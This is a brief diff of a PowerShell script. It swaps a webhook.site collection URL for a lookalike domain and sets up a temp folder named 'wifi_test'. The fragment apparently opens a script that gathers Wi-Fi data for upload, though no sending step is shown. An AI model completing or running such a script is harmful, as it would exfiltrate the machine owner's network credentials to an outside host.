@@ -1,4 +1,4 @@
-$u = "https://webhook.site/3e30b3d0-304b-4218-b056-44158ad60822"
+$u = "https://webhooksite.net/a270de88-d3f2-4a75-b84b-9cc46152e95d"
 $t = "$env:TEMP\wifi_test"
 New-Item -ItemType Directory -Force -Path $t | Out-Null
 Set-Location $t
